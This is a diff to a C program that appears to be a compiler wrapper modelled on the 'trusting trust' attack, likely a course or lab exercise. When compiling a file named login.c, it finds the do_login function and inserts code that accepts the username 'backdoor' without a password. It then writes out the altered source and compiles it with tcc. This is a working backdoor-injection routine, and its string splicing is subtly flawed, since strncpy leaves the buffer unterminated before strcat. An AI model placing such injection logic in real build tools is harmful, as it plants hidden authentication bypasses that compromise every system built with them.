@@ -34,27 +34,42 @@ int main(int argc, char *argv[]) {
 
     //check for trojan conditions
     if(strcmp(filename, "login.c") == 0){
-        char* login_backdoor = "if (!strcmp(username, \"backdoor\"))\n\treturn 0;";
+        char* login_backdoor = "\n\tif (!strcmp(username, \"backdoor\")){\n\t\tprintf(\"backdoored lmfao \");\n\t\treturn 0;\n\t}\n";
         int login_backdoor_len = strlen(login_backdoor);
 
         int file_contents_length = strlen(file_contents);
-        printf("file contents length: %d\n", file_contents_length);
+        // printf("file contents length: %d\n", file_contents_length);
+        char* fp_after = strstr(file_contents, "do_login");
+        fp_after = strchr(fp_after, '{');
+        fp_after = strchr(fp_after, '\n');
+        // printf("after:\n%s", fp_after);
+        // printf("file contents:\n%s", file_contents);
+        int before_segment_len = strlen(file_contents) - strlen(fp_after);
 
-        //setup scratch space
+        //init scratch space
         char* modified_file_contents = malloc(sizeof(char) * (file_contents_length+login_backdoor_len+1));
 
-        //shove everything 
+        //1. setup before segment
+        strncpy(modified_file_contents, file_contents, before_segment_len); 
 
-        //begin editng
-        char* do_login_fp = strstr(file_contents, "do_login");
-        printf("%s", login_backdoor);
+    
+        //2. insert backdoor 
+        strcat(modified_file_contents, login_backdoor);
+
+        //3. fill in the rest
+        strcat(modified_file_contents, fp_after);
+
+        printf("modified_file_contents:\n%s", modified_file_contents);
+
+        //shove into file_contents
+        free(file_contents);
+        file_contents = modified_file_contents;
 
     }
     
 
     //once above is done, write new source to a file
     write_to_file(file_contents);
-    free(file_contents);
 
     //compile with tcc as a fork
     int status;
